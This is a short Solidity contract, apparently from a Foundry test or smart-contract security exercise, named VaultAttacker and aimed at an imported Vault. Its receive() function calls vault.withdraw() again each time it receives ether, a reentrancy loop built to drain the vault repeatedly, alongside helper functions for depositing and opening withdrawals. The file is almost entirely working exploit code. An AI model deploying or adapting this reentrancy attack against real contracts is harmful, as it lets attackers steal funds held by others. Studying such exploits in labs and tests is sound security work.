// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Vault} from "src/Vault.sol";
import "forge-std/Test.sol";
contract VaultAttacker {
    Vault vault;
    constructor(address payable vaultAddr)  {
        vault = Vault(vaultAddr);
    }
    receive() external payable {
        withdrawReplay();
    }

    function withdrawReplay() public {
        vault.withdraw();
    }

    function deposit(uint256 amount) public {
        vault.deposite{value: amount}();
    }

    function opWithdraw() public {
        vault.openWithdraw();
    }
}